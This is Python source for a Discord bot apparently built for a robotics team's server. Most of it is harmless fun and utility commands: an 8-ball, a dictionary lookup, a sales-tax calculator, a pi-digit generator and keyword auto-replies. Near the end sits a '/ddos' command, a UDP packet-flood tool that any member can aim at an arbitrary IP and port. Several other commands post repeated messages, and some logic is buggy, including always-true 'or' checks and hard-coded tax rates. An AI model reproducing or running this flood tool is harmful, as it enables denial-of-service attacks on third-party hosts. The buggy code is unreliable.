        "Cannot predict now.",
        "Concentrate and ask again.",
        "Don’t count on it.",
        "It is certain.",
        "It is decidedly so.",
        "Most likely.",
        "My reply is no.",
        "My sources say no.",
        "Outlook not so good.",
        "Outlook good.",
        "Reply hazy, try again.",
        "Signs point to yes.",
        "Very doubtful.",
        "Without a doubt.",
        "Yes.",
        "Yes – definitely.",
        "You may rely on it.",
        "No it'll never happen give up.",
        "It might happen but ehhhhhhh.",
        "stfu i aint god."]
    final_response = random.choice(responses)
    embed = discord.Embed(
        title = "8ball command",
        description = f"Question: **{user_question}**\nAnswer: **{final_response}**",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.reply(embed = embed)


#DICE COMMAND; 1-6
@client.command()
async def dice(ctx):
    dice_number = randint(1,6)
    await ctx.send(dice_number)


'''
@client.command(aliases = ["rps", "RPS", "Rps", "rockpaperscissors", "Rockpaperscissors", "RockPaperScissors", "rockpaperscissor", "Rockpaperscissor", "RockPaperScissor"])
@cooldown(5, 10, BucketType.default)
async def _rpsgame(ctx, user_rps_input):
    print("someone used the rps command")
    bot_rps_list = ["rock", "paper", "scissors"]
    bots_rps_choice = random.choice(bot_rps_list)
    print(f"bot chose {bots_rps_choice} in rps game")

    if user_rps_input == "rock" or "Rock" or "ROCK" or "paper" or "Paper" or "PAPER" or "scissors" or "Scissors" or "SCISSORS" or "scissor" or "Scissor" or "SCISSOR":
        if user_rps_input == bots_rps_choice:
            print("Tied")
            await ctx.send(f"Tie! Your picked {user_rps_input} and I picked {bots_rps_choice} which results in a tie")
        else:
            if user_rps_input == "rock" or "Rock" or "ROCK":
                if bots_rps_choice != "paper":
                    print("Bot lost")
                    await ctx.send(f"You win! You picked {user_rps_input} and I picked {bots_rps_choice}")
                else:
                    print("Bot won")
                    await ctx.send(f"I win! You picked {user_rps_input} and I picked {bots_rps_choice}")

            elif user_rps_input == "paper" or "Paper" or "PAPER":
                if bots_rps_choice != "scissors":
                    print("Bot lost")
                    await ctx.send(f"You win! You picked {user_rps_input} and I picked {bots_rps_choice}")
                else:
                    print("Bot won")
                    await ctx.send(f"I win! You picked {user_rps_input} and I picked {bots_rps_choice}")

            elif user_rps_input == "scissors" or "Scissors" or "SCISSORS" or "scissor" or "Scissor" or "SCISSOR":
                if bots_rps_choice != "paper":
                    print("Bot lost")
                    await ctx.send(f"You win! You picked {user_rps_input} and I picked {bots_rps_choice}")
                else:
                    print("Bot won")
                    await ctx.send(f"I win! You picked {user_rps_input} and I picked {bots_rps_choice}")
    else:
        await ctx.send("Please use a valid syntax! e.g '/rps rock'")
'''


#MEME COMMAND
@client.command(aliases = ["meme", "Meme"])
async def _sendsmeme(ctx):
    random_meme_number = randint(1,5000)
    embed = discord.Embed(
        color = bot_color
    )
    embed.set_image(url = f"https://ctk-api.herokuapp.com/meme/{random_meme_number}")
    await ctx.reply(embed = embed)


'''END OF GAME RELATED COMMANDS'''

'''START OF RESPONSES OR RELATED COMMANDS'''


#WELCOME
@client.command(aliases = ["welcome", "Welcome"])
async def _welcomecommand(ctx):
    embed = discord.Embed(
        title = "Welcome!",
        description = "Welcome to the Team Magma 3008 Robotics official discord server! Feel free to look around and make yourself at home!",
        color = bot_color
    )
    await ctx.send(embed = embed)


#DESCRIPTION
@client.command(aliases = ["description", "Description"])
async def _descriptioncommand(ctx):
    embed = discord.Embed(
        title = "Server description",
        description = "This is the Official Team Magma 3008 Robotics discord server",
        color = bot_color
    )
    await ctx.send(embed = embed)


#BOT DESCRIPTION COMMAND 
@client.command(aliases = ["BotDesc", "botdesc", "BotDescription", "Botdescription", "botdescription"])
async def _botdescription(ctx):
    await ctx.send("Hi! I am a bot known as MagmaBot. I am a bot specifically designed and programmed by Kiet P. for the Team Magma 3008 Robotics official discord server using Python and DBscript")


#GOOGLE COMMAND  
@client.command(aliases = ["google", "Google", "GOOGLE"])
async def _googlelinklmao(ctx):
    await ctx.send("<https://searchengineland.com/guide/how-to-use-google-to-search>")


#BENICE SEND FUNNY 'BE NICE TO SERVER STAFF'
@client.command(aliases = ["benice", "Benice", "BeNice"])
async def _benicetoserverstaff(ctx):
    await ctx.send("https://media.discordapp.net/attachments/709672550707363931/721226547817873519/tenor.gif")


#MagmaBot COUNTS FOR 24 HOURS
@client.command(aliases = ["count", "Count"])
@cooldown(1, 86400, BucketType.default)
async def _count(ctx):
    mag_count = 0
    print("someone activated the count feature")
    while mag_count != 86400:
        await asyncio.sleep(1)
        await ctx.send(mag_count)
        mag_count = mag_count + 1


#DICTIONARY COMMAND, GIVES YOU THE DEFINITION, SYNONYM, ANTONYM, AND LINK OF THE WORD MENTIONED
@client.command(aliases = ["Dictionary", "dictionary", "Dict", "dict"])
@cooldown(3, 30, BucketType.default)
async def _dictionarycommand(ctx, user_dictionary_request):
    dictionary = PyDictionary
    print(f"Someone used the dictionary command for the word {user_dictionary_request}")

    author_name = ctx.author.display_name
    word_meaning = dictionary.meaning(user_dictionary_request)
    word_synonym = dictionary.synonym(user_dictionary_request)
    word_antonym = dictionary.antonym(user_dictionary_request)

    embed = discord.Embed(
        title = f"Dictionary definition, synonym, and antonym for the word {user_dictionary_request}",
        description = f"**Meaning:** {word_meaning}\n\n**Synonyms:** {word_synonym}\n\n**Antonyms:** {word_antonym}",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")

    await ctx.send(f"Getting you the definition of the word **{user_dictionary_request}**")
    await asyncio.sleep(float(0.5))
    await ctx.reply(embed = embed)
    await asyncio.sleep(float(0.5))
    await ctx.send(f"Here is the link:\nhttps://www.dictionary.com/browse/{user_dictionary_request}?s=t")


#SYNONYM COMMAND, GIVES YOU THE SYNONYM OF THE WORD MENTIONED
@client.command(aliases = ["synonym", "Synonym"])
@cooldown(3, 30, BucketType.default)
async def _synonymcommand(ctx, user_synonym_request):
    dictionary = PyDictionary
    print(f"Someone used the synonym command for the word {user_synonym_request}")

    author_name = ctx.author.display_name
    word_synonym = dictionary.synonym(user_synonym_request)

    embed = discord.Embed(
        title = f"Synonyms for the word **{user_synonym_request}**",
        description = f"**Synonyms:** {word_synonym}",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")

    await ctx.send(f"Getting you the synonyms for the word {user_synonym_request}")
    await asyncio.sleep(float(0.5))
    await ctx.reply(embed = embed)


#ANTONYM COMMAND, GIVES YOU THE ANTONYM OF THE WORD MENTIONED
@client.command(aliases = ["antonym", "Antonym"])
@cooldown(3, 30, BucketType.default)
async def _antonymcommand(ctx, user_antonym_request):
    dictionary = PyDictionary
    print(f"Someone used the antonym command for the word {user_antonym_request}")

    author_name = ctx.author.display_name
    word_antonym = dictionary.antonym(user_antonym_request)

    embed = discord.Embed(
        title = f"Antonyms for the word **{user_antonym_request}**",
        description = f"**Antonyms:** {word_antonym}",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")

    await ctx.send(f"Getting you the antonyms for the word {user_antonym_request}")
    await asyncio.sleep(float(0.5))
    await ctx.reply(embed = embed)


#REPEAT COMMAND; BOT REPEATS AFTER USER
@client.command(aliases = ["repeat", "Repeat", "say", "Say"])
@cooldown(5, 60, BucketType.default)
async def _repeat_after_user(ctx, *, user_repeat_input):
    if "@everyone" in user_repeat_input:
        await ctx.reply("Cannot repeat mass ping")
    else:
        if "@here" in user_repeat_input:
            await ctx.reply("Cannot repeat mass ping")
        else:
            await ctx.send(f"{user_repeat_input}")


#TWITCH LINK COMMAND
@client.command(aliases = ["twitch", "Twitch"])
async def _twitchlink(ctx):
    await ctx.send("https://twitch.tv/captainvietnam6")


#EW LIGHTMODE BADDDDDD
@client.command(aliases = ["lightmode", "Lightmode", "discordlightmode", "Discordlightmode"])
@cooldown(1, 5, BucketType.default)
async def _ewlightmode(ctx):
    await ctx.send("eW liGht mOdE bAd DarK MOdE GOoD")


#REPLY SPAM COMMAND
#spams what you type after "/spam" 5 times
@client.command(aliases = ["spam", "Spam"])
@cooldown(1, 60, BucketType.default)
async def _replyspam(ctx, *, user_spam_input):
    print("Someone activated the reply spam command")
    if "@everyone" in user_spam_input:
        await ctx.reply("Cannot spam mass ping")
    else:
        if "@here" in user_spam_input:
            await ctx.reply("Cannot spam mass ping")
        else:
            for i in range(5):
                await ctx.send(f"{user_spam_input}")
                await asyncio.sleep(float(0.1))
            await asyncio.sleep(float(0.25))
            print("Reply spam command ended")
            await ctx.reply("Please wait 60 seconds to use this command again.")


#PRINT COMMAND; SENDS A FANCY EMBED IMAGE WITH AUTHOR'S MESSAGE
@client.command(aliases = ["print", "Print"])
#@cooldown(1, 10, BucketType.default)
async def _printmessage(ctx, *, user_print_message):
    embed = discord.Embed(
        color = bot_color
    )
    embed.set_image(url = f"https://flamingtext.com/net-fu/proxy_form.cgi?script=crafts-logo&text={user_print_message}+&_loc=generate&imageoutput=true")
    await ctx.send(embed = embed)


#SENDS SPEEDRUN.COM PROFILE OF USER
@client.command(aliases = ["speedrun", "Speedrun"])
async def _speedrunprofile(ctx, user_speedrun_input):
    await ctx.send(f"Sending {user_speedrun_input}'s profile...")
    await asyncio.sleep(float(1.5))
    await ctx.reply(f"https://speedrun.com/user/{user_speedrun_input}")


#SHUT UP COMMAND
@client.command(aliases = ["shut", "Shut"])
async def _shutupcommand(ctx):
    await ctx.send("https://tenor.com/view/meryl-streep-shut-up-yell-gif-15386483")


#SEND NOTHING COMMAND
@client.command(aliases = ["nothing"])
async def _sendnothinglol(ctx):
    await ctx.send("⠀⠀⠀⠀⠀")


#DISCORDMOD FUNNY
@client.command(aliases = ["discordmod", "Discordmod"])
async def _funnydiscordmod(ctx):
    await ctx.send("https://i.kym-cdn.com/entries/icons/original/000/035/767/cover4.jpg")


#CALCULATE COMMAND TO REQUESTED DIGITS OF PI
@client.command(aliases = ["pi", "Pi", "PI", "π"])
async def _pi_digits_calc(ctx, pi_digits):
    DIGITS = int(pi_digits)
    decimal_places = DIGITS - 1
    author_name = ctx.author.display_name

    if DIGITS < 1000000:
        def pi_digits(x):
            #Generate x digits of Pi
            k, a, b, a1, b1 = 2, 4, 1, 12, 4
            while x > 0:
                p, q, k = k * k, 2 * k + 1, k + 1
                a, b, a1, b1 = a1, b1, p * a + q * a1, p * b + q * b1
                d, d1 = a/b, a1/b1

                while d == d1 and x > 0:
                    yield int(d)
                    x -= 1
                    a, a1 = 10 * (a % b), 10 * (a1 % b1)
                    d, d1 = a/b, a1/b1
        
        digits = [str(n) for n in list(pi_digits(DIGITS))]
        pi_output = "%s.%s\n" % (digits.pop(0), "".join(digits))
    
        if DIGITS > 0 and DIGITS <= 2000:
            embed = discord.Embed(
                title = f"Pi to the {decimal_places}th decimal place (or {DIGITS} digits)",
                description = f"{pi_output}",
                color = bot_color
            )
            embed.set_footer(text = f"Requested by {author_name}")
            
            print(f"Someone used the Pi calculator command to {DIGITS} digits")
            await ctx.send(f"Calculating Pi to {DIGITS} digits...")
            await asyncio.sleep(float(0.5))
            await ctx.reply(embed = embed)
        
        elif DIGITS < 0:
            print("Pi calculator error: requested digits under 0")
            await ctx.reply("Error: requested digits cannot be under 0 or be negative")
        
        elif DIGITS > 2000:
            print("Warning: requested digits cannot be over 2000 for a discord embed.\nReturning a .txt file containing digits")
            await ctx.reply("Warning: requested digits cannot be over 2000 for a discord embed.\n**Returning a .txt file containing digits**")

            file = open(f"pi_calc_output_{DIGITS}_digits.txt", "w")
            file.write(pi_output)
            shutil.move(f"/home/runner/MagmaBot/pi_calc_output_{DIGITS}_digits.txt", f"/home/runner/MagmaBot/generated_files/pi_calc_output_{DIGITS}_digits.txt")
            await ctx.send(file = discord.File(rf"/home/runner/MagmaBot/generated_files/pi_calc_output_{DIGITS}_digits.txt"))
            os.remove(f"/home/runner/MagmaBot/generated_files/pi_calc_output_{DIGITS}_digits.txt")

    else:
        await ctx.reply("Requested digits over 1,000,000 (one million). The command will return a text file if the requested number is over 2000 but under 1,000,000 digits. If under 2000, it will send as a discord embed message.")


#CACLULATE TAXES
@client.command(aliases = ["tax", "Tax", "calctax", "calcTax", "Calctax", "CalcTax"])
async def _calculate_taxes(ctx, cost, *, state = "hawaii"):
    if state == "alabama" or state == "Alabama":
        tax_rate = float(1.04)
        tax_output = float(cost) * tax_rate
    elif state == "alaska" or state == "Alaska":
        tax_rate = float(1.0)
        tax_output = float(cost) * tax_rate
    elif state == "arizona" or state == "Arizona":
        tax_rate = float(1.056)
        tax_output = float(cost) * tax_rate
    elif state == "arkansas" or state == "Arkansas":
        tax_rate = float(1.065)
        tax_output = float(cost) * tax_rate
    elif state == "california" or state == "California":
        tax_rate = float(1.0725)
        tax_output = float(cost) * tax_rate
    elif state == "colorado" or state == "Colorado":
        tax_rate = float(1.029)
        tax_output = float(cost) * tax_rate
    elif state == "connecticut" or state == "Connecticut":
        tax_rate = float(1.0635)
        tax_output = float(cost) * tax_rate
    elif state == "delaware" or state == "Delaware":
        tax_rate = float(1.0)
        tax_output = float(cost) * tax_rate
    elif state == "florida" or state == "Florida":
        tax_rate = float(1.06)
        tax_output = float(cost) * tax_rate
    elif state == "georgia" or state == "Georgia":
        tax_rate = float(1.04)
        tax_output = float(cost) * tax_rate
    elif state == "hawaii"  or state == "Hawaii":
        tax_rate = float(1.04)
        tax_output = float(cost) * tax_rate
    elif state == "idaho" or state == "Idaho":
        tax_rate = float(1.06)
        tax_output = float(cost) * tax_rate
    elif state == "illinois" or state == "Illinois":
        tax_rate = float(1.0625)
        tax_output = float(cost) * tax_rate
    elif state == "indiana" or state == "Indiana":
        tax_rate = float(1.07)
        tax_output = float(cost) * tax_rate
    elif state == "iowa" or state == "Iowa":
        tax_rate = float(1.06)
        tax_output = float(cost) * tax_rate
    elif state == "kansas" or state == "Kansas":
        tax_rate = float(1.065)
        tax_output = float(cost) * tax_rate
    elif state == "kentucky" or state == "Kentucky":
        tax_rate = float(1.06)
        tax_output = float(cost) * tax_rate
    elif state == "louisiana" or state == "Louisiana":
        tax_rate = float(1.0445)
        tax_output = float(cost) * tax_rate
    elif state == "maine" or state == "Maine":
        tax_rate = float(1.055)
        tax_output = float(cost) * tax_rate
    elif state == "maryland" or state == "Maryland":
        tax_rate = float(1.06)
        tax_output = float(cost) * tax_rate
    elif state == "massachusetts" or state == "Massachusetts":
        tax_rate = float(1.065)
        tax_output = float(cost) * tax_rate
    elif state == "michigan" or state == "Michigan":
        tax_rate = float(1.06)
        tax_output = float(cost) * tax_rate
    elif state == "minnesota" or state == "Minnesota":
        tax_rate = float(1.06875)
        tax_output = float(cost) * tax_rate
    elif state == "mississippi" or state == "Mississippi":
        tax_rate = float(1.07)
        tax_output = float(cost) * tax_rate
    elif state == "missouri" or state == "Missouri":
        tax_rate = float(1.04225)
        tax_output = float(cost) * tax_rate
    elif state == "montana" or state == "Montana":
        tax_rate = float(1)
        tax_output = float(cost) * tax_rate
    elif state == "nebraska" or state == "Nebraska":
        tax_rate = float(1.055)
        tax_output = float(cost) * tax_rate
    elif state == "nevada" or state == "Nevada":
        tax_rate = float(1.0685)
        tax_output = float(cost) * tax_rate
    elif state == "new hampshire" or state == "New hampshire" or state == "New Hampshire":
        tax_rate = float(1)
        tax_output = float(cost) * tax_rate
    elif state == "new jersey" or state == "New jersey" or state == "New Jersey":
        tax_rate = float(1.06625)
        tax_output = float(cost) * tax_rate
    elif state == "new mexico" or state == "New mexico" or "New Mexico":
        tax_rate = float(1.05125)
        tax_output = float(cost) * tax_rate
    elif state == "new york" or state == "New york" or state == "New York":
        tax_rate = float(1.04)
        tax_output = float(cost) * tax_rate
    elif state == "north carolina" or state == "North carolina" or state == "North Carolina":
        tax_rate = float(1.0475)
        tax_output = float(cost) * tax_rate
    elif state == "north dakota" or state == "North dakota" or state == "North Dakota":
        tax_rate = float(1.05)
        tax_output = float(cost) * tax_rate
    elif state == "ohio" or state == "Ohio":
        tax_rate = float(1.0575)
        tax_output = float(cost) * tax_rate
    elif state == "oklahoma" or state == "Oklahoma":
        tax_rate = float(1.045)
        tax_output = float(cost) * tax_rate
    elif state == "oregon" or state == "Oregon":
        tax_rate = float(1)
        tax_output = float(cost) * tax_rate
    elif state == "pennsylvania" or state == "Pennsylvania":
        tax_rate = float(1.06)
        tax_output = float(cost) * tax_rate
    elif state == "rhode island" or state == "Rhode island" or state == "Rhode Island":
        tax_rate = float(1.07)
        tax_output = float(cost) * tax_rate
    elif state == "south carolina" or state == "South carolina" or state == "South Carolina":
        tax_rate = float(1.06)
        tax_output = float(cost) * tax_rate
    elif state == "south dakota" or state == "South dakota" or state == "South Dakota":
        tax_rate = float(1.045)
        tax_output = float(cost) * tax_rate
    elif state == "tennessee" or state == "Tennessee":
        tax_rate = float(1.07)
        tax_output = float(cost) * tax_rate
    elif state == "texas" or state == "Texas":
        tax_rate = float(1.0625)
        tax_output = float(cost) * tax_rate
    elif state == "utah" or state == "Utah":
        tax_rate = float(1.061)
        tax_output = float(cost) * tax_rate
    elif state == "vermont" or state == "Vermont":
        tax_rate = float(1.06)
        tax_output = float(cost) * tax_rate
    elif state == "virginia" or state == "Virginia":
        tax_rate = float(1.053)
        tax_output = float(cost) * tax_rate
    elif state == "washington" or state == "Washington":
        tax_rate = float(1.065)
        tax_output = float(cost) * tax_rate
    elif state == "west virginia" or state == "West virginia" or state == "West Virginia":
        tax_rate = float(1.06)
        tax_output = float(cost) * tax_rate
    elif state == "wisconsin" or state == "Wisconsin":
        tax_rate = float(1.065)
        tax_output = float(cost) * tax_rate
    elif state == "wyoming" or state == "Wyoming":
        tax_rate = float(1)
        tax_output = float(cost) * tax_rate
    
    embed = discord.Embed(
        title = f"**Tax rate & total for the state of {state}:**",
        description = f"Subtotal: {float(cost)}\nTax Rate: {round(float(tax_rate * 100 - 100), 2)}%\nTotal: ${round(float(tax_output), 2)}",
        color = bot_color
    )
    await ctx.reply(embed = embed)
    #await ctx.reply(f"**Tax rate & total for the state of {state}:**\nSubtotal: {float(cost)}\nTotal: ${round(float(tax_output), 2)}")


#TIME COMMAND
@client.command(aliases = ["time", "Time"])
async def _hsttime(ctx):
    author_name = ctx.author.display_name
    seconds = time.time()
    local_time = time.ctime(seconds - 10 * 60 * 60)

    embed = discord.Embed(
        title = "HST Local Time",
        description = f"The local time is **{local_time}** (Hawaii-Aleutian standard time)",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.reply(embed = embed)


#DM USER COMMAND
@client.command(aliases = ["DM", "Dm", "dm"])
async def _dm_user_(ctx, member: discord.Member, *, user_message):
    channel = await member.create_dm()
    await channel.send(user_message)
    await ctx.send("DMed user the message")


#RANDOMLY PINGS SOMEONE COMMAND
@client.command(aliases = ["random", "Random", "someone", "Someone"])
@cooldown(1, 60, BucketType.user)
async def _random_ping(ctx):
    channel = ctx.channel
    random_member = random.choice(channel.guild.members)
    await channel.send(f"@{random_member}")
    print("someone used the random ping command")


#I LIKE TRAINS GIF SEND
@client.command(aliases = ["trains", "Trains", "Train", "train"])
async def _iliketrains_gif(ctx):
    await ctx.send("https://tenor.com/view/funny-iliketrains-trains-gif-4905803")


#ENCRYPTION ALGORITHM
@client.command(aliases = ["encrypt", "Encrypt"])
async def _encrypt_message(ctx, *, user_input):
    author_name = ctx.author.display_name
    encrypt_output = []
    user_input = user_input.lower()

    #the conversion table is a dictionary that just moves the character to the next one in the english alphabet
    conversion_table = {
        "a" : "b", "b" : "c", "c" : "d", "d" : "e", "e" : "f", "f" : "g", "g" : "h", "h" : "i", "i" : "j", "j" : "k", "k" : "l", "l" : "m", "m" : "n", "n" : "o", "o" : "p", "p" : "q", "q" : "r", "r" : "s", "s" : "t", "t" : "u", "u" : "v", "v" : "w", "w" : "x", "x" : "y", "y" : "z", "z" : "a", "0" : "1", "1" : "2", "2" : "3", "3" : "4", "4" : "5", "5" : "6", "6" : "7", "7" : "8", "8" : "9", "9" : "0", " " : " "
    }

    #for each character in the user message, it will find a corresponding letter in the dictionary and append it to the list
    for character in user_input: 
        character_output = str(conversion_table[str(character)])
        encrypt_output.append(character_output)

    #sends the final message
    final_output = "".join(encrypt_output)
    embed = discord.Embed(
        title = "Message Encryption",
        description = f"{final_output}",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")

    #await ctx.message.delete(1)
    await ctx.message.delete()
    await asyncio.sleep(float(0.5))
    await ctx.send(embed = embed)


#DECRYPTION ALGORITHM
@client.command(aliases = ["decrypt", "Decrypt"])
async def _decrypt_message(ctx, *, user_input):
    author_name = ctx.author.display_name
    decrypt_output = []
    user_input = user_input.lower()

    #the decrypt conversion table is a dictionary that just moves the character to the previous one in the english alphabet
    conversion_table = {
        "b" : "a", "c" : "b", "d" : "c", "e" : "d", "f" : "e", "g" : "f", "h" : "g", "i" : "h", "j" : "i", "k" : "j", "l" : "k", "m" : "l", "n" : "m", "o" : "n", "p" : "o", "q" : "p", "r" : "q", "s" : "r", "t" : "s", "u" : "t", "v" : "u", "w" : "v", "x" : "w", "y" : "x", "z" : "y", "a" : "z", "1" : "0", "2" : "1", "3" : "2", "4" : "3", "5" : "4", "6" : "5", "7" : "6", "8" : "7", "9" : "8", "0" : "9", " " : " "
    }

    #for each character in the user message, it will find a corresponding letter in the dictionary and append it to the list
    for character in user_input: 
        character_output = str(conversion_table[str(character)])
        decrypt_output.append(character_output)

    #same thing as before but decrypting
    final_output = "".join(decrypt_output)
    embed = discord.Embed(
        title = "Message Decryption",
        description = f"{final_output}",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")

    #await ctx.message.delete(1)
    await ctx.message.delete()
    await asyncio.sleep(float(0.5))
    await ctx.send(embed = embed)


#DDOS COMMAND
@client.command(pass_context = True, aliases = ["ddos", "DDos", "DDOS"])
async def _DDoS_attack(ctx, ip, port, hold_time):
    socket = sct.socket(sct.AF_INET, sct.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0

    embed = discord.Embed(
        title = "**MagmaBot DDoS Tool**",
        description = f"DDoS attack started against target\nIP: **{str(ip)}**\nPort: **{str(port)}**",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {ctx.author.display_name}, Attacks sent: {sent}")
    await ctx.reply(embed = embed)

    while sent < 250:
        socket.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        if port == 65534:
            port = 1

        upt_embed = embed
        upt_embed.set_footer(text = f"Requested by {ctx.author.display_name}, Attacks sent: {sent}")
        print(f"Sent %s packet to %s throught port:%s"%(sent,ip,port))
        await ctx.reply(embed = embed).edit(upt_embed)


#BELOW HERE IS THE ALWAYS ACTIVE CLIENT.LISTEN AND ON_MESSAGE COMMANDS


#AI RESPONSE COMMAND
@client.listen("on_message")
async def ai_chatbot(message):
    if message.author.bot:
        return
    else:
        if "<@873118823237160991>" in message.content or "<@!873118823237160991>" in message.content:
            if message.channel.id == 877987581860671528 or message.channel.id == 873121282194022450:
                    print("AI ChatBot command used")
            else:
                await message.channel.send("if you're trying to use the AI Chatbot command, please use <#877987581860671528> or <#873121282194022450>")
                print("someone tried to use the AI ChatBot command out of designated channel")
                return
        else:
            return


#FAIR
@client.listen("on_message")
async def replyping(message):
    if message.author.bot:   #ends command if "fair" is detected from a bot, this stops spam loops
        return
    if "fair" in message.content:   #if "fair" is in a message the member sends, it replies with "fair"
        await message.channel.send("fair")


#POG REPLY
@client.listen("on_message")
async def replypog(message):
    pog_responses = ["pog", "poggers", "pogsss", "pogs", "pogs?"]

    if message.author.bot:
        return
    if "pog" in message.content:
        await message.channel.send(random.choice(pog_responses))
    if "POG" in message.content:
        await message.channel.send(random.choice(pog_responses))
    if "Pog" in message.content:
        await message.channel.send(random.choice(pog_responses))


'''
#CAPT GET PINGED
@client.listen("on_message")
async def captgetpinged(message):
    pinged_reply_messages = ["haha ping", "lol kiet got pinged", "quick reminder that if Kiet doesn't reply in under a minute he's probably offline or sleeping"]
    capt_got_pinged_message = random.choice(pinged_reply_messages)
    if message.author.bot:
        return
    #mobile varient
    if "<@467451098735837186>" in message.content:
        await message.channel.send(f"{capt_got_pinged_message}")
    #PC varient
    if "<@!467451098735837186>" in message.content:
        await message.channel.send(f"{capt_got_pinged_message}")
'''


'''
#MagmaBot GETS PINGED
@client.listen("on_message")
async def maggetpiged(message):
    if message.author.bot:
        return
    #mobile varient
    if "<@873118823237160991>" in message.content:
        await message.channel.send("why did you ping me lol")
    #PC varient
    if "<@!873118823237160991>" in message.content:
        await message.channel.send("why did you ping me lol")
'''

#REPLY GOODNIGHT IF SOMEONE SAYS GOODNIGHT OR SIMILAR
@client.listen("on_message")
async def _replygoodnight(message):
    if message.author.bot:
        return
    if "goodnight" in message.content:
        await message.channel.send("goodnight!")
    if "Goodnight" in message.content:
        await message.channel.send("goodnight!")
    if "gn " in message.content:
        await message.channel.send("goodnight!")
    if "Gn" in message.content:
        await message.channel.send("goodnight!")
    if "GN" in message.content:
        await message.channel.send("goodnight!")


#DETECTS CODE
@client.listen("on_message")
async def _detects_code(message):
    if message.author.bot:
        return
    if "```py" in message.content:
        await message.channel.send("woah python code")
    if "```java" in message.content:
        await message.channel.send("woah java code")
    if "```js" in message.content:
        await message.channel.send("woah JavaScript code")
    if "```javascript" in message.content:
        await message.channel.send("woah JavaScript code")
    if "```ruby" in message.content:
        await message.channel.send("woah ruby code")
    if "```cpp" in message.content:
        await message.channel.send("woah C++ code")
    if "```c++" in message.content:
        await message.channel.send("woah C++ code")
    if "```c" in message.content:
        await message.channel.send("woah C code")
    if "```kotlin" in message.content:
        await message.channel.send("woah kotlin code")
    if "```go" in message.content:
        await message.channel.send("woah go code")
    if "```swift" in message.content:
        await message.channel.send("woah swift code")
    if "```rust" in message.content:
        await message.channel.send("woah rust code")
@client.listen("on_message")
async def _detects_code2(message):
    if message.author.bot:
        return
    if "```html" in message.content:
        await message.channel.send("wow HTML code")
    if "```css" in message.content:
        await message.channel.send("wow CSS code")


#REPLIES STFU COMMAND
@client.listen("on_message")
async def _ramdon_stfu_detect(message):
    mention = message.author.id
    stfu_reponses_list = [
        "heyyyy that's mean :(",
        "pls don't tell people to shut up thats mean :("
        "meanie"
    ]

    stfu_responses = random.choice(stfu_reponses_list)

    if message.author.bot:
        return
    else:
        if "stfu" in message.content:
            await message.channel.send(f"<@{mention}> {stfu_responses}")
        if "STFU" in message.content:
            await message.channel.send(f"<@{mention}> {stfu_responses}")
        if "Stfu" in message.content:
            await message.channel.send(f"<@{mention}> {stfu_responses}")
        if "shut up" in message.content:
            await message.channel.send(f"<@{mention}> {stfu_responses}")
        if "Shut up" in message.content:
            await message.channel.send(f"<@{mention}> {stfu_responses}")
        if "SHUT UP" in message.content:
            await message.channel.send(f"<@{mention}> {stfu_responses}")


'''
#REPLIES WITH SUS GIF WHEN SOMEONE SAYS SUS
@client.listen("on_message")
async def _sus_gif_send(message):
    if message.author.bot:
        return
    else:
        if "sus" in message.content:
            await message.channel.send("https://tenor.com/view/sus-suspect-among-us-gif-18663592")
        if "Sus" in message.content:
            await message.channel.send("https://tenor.com/view/sus-suspect-among-us-gif-18663592")
        if "SUS" in message.content:
            await message.channel.send("https://tenor.com/view/sus-suspect-among-us-gif-18663592")
'''


#SOMEONE SAY MATH?
@client.listen("on_message")
async def _you_said_math(message):
    if message.author.bot:
        return
    else:
        if "math" in message.content:
            await message.channel.send("math?")
            await asyncio.sleep(float(0.25))
            await message.channel.send("hey i heard someone mention math?")
            await asyncio.sleep(float(0.25))
            await message.channel.send("1+1=3")
        if "Math" in message.content:
            await message.channel.send("math?")
            await asyncio.sleep(float(0.25))
            await message.channel.send("hey i heard someone mention math?")
            await asyncio.sleep(float(0.25))
            await message.channel.send("1+1=3")


'''END OF RESPONSES OR RELATED COMMANDS'''


'''START OF EMOJI RESPONSES COMMANDS'''

#SAMPLE ON MESSAGE CODE
'''
@client.listen("on_message")
async def _(message):
    if message.author.bot:
        return
    if "" in message.content:
        await message.channel.send("")
    if "" in message.content:
        await message.channel.send("")
'''

#SAMPLE RESPONSE COMMAND CODE
'''
@client.command(aliases = ["", ""])
async def _(ctx):
    await ctx.send("")
'''

#FULL SET
'''
@client.listen("on_message")
async def _(message):
    if message.author.bot:
        return
    if "" in message.content:
        await message.channel.send("")
    if "" in message.content:
        await message.channel.send("")

@client.command(aliases = ["", ""])
async def _(ctx):
    await ctx.send("")
'''


#SO FAKE EMOJI
@client.listen("on_message")
async def _sofakeemoji(message):
    if message.author.bot:
        return
    if "fake" in message.content:
        await message.channel.send("<:mag_so_fake:812995927605903400>")
    if "Fake" in message.content:
        await message.channel.send("<:mag_so_fake:812995927605903400>")

@client.command(aliases = ["fake", "Fake"])
async def _sofakeemojisend(ctx):
    await ctx.send("<:mag_so_fake:812995927605903400>")


#DOUBT EMOJI
@client.listen("on_message")
async def _doubtemoji(message):
    if message.author.bot:
        return
    if "Doubt" in message.content:
        await message.channel.send("<:mag_X_doubt:812995858781438022>")
    if "doubt" in message.content:
        await message.channel.send("<:mag_X_doubt:812995858781438022>")

@client.command(aliases = ["doubt", "Doubt"])
async def _doubtemojisend(ctx):
    await ctx.send("<:mag_X_doubt:812995858781438022>")


#STONKS EMOJI
@client.listen("on_message")
async def _stonksemoji(message):
    if message.author.bot:
        return
    if "stonk" in message.content:
        await message.channel.send("<:mag_stonks:812995837613309992>")
    if "Stonk" in message.content:
        await message.channel.send("<:mag_stonks:812995837613309992>")

@client.command(aliases = ["stonks", "stonk", "Stonks", "Stonk"])
async def _stonksemojisend(ctx):
    await ctx.send("<:mag_stonks:812995837613309992>")


#SIMP PILLS EMOJI
@client.listen("on_message")
async def _simppills(message):
    if message.author.bot:
        return
    if "simp" in message.content:
        await message.channel.send("<:mag_simp_pills:812995814904561695>")
    if "Simp" in message.content:
        await message.channel.send("<:mag_simp_pills:812995814904561695>")

@client.command(aliases = ["simp", "Simp"])
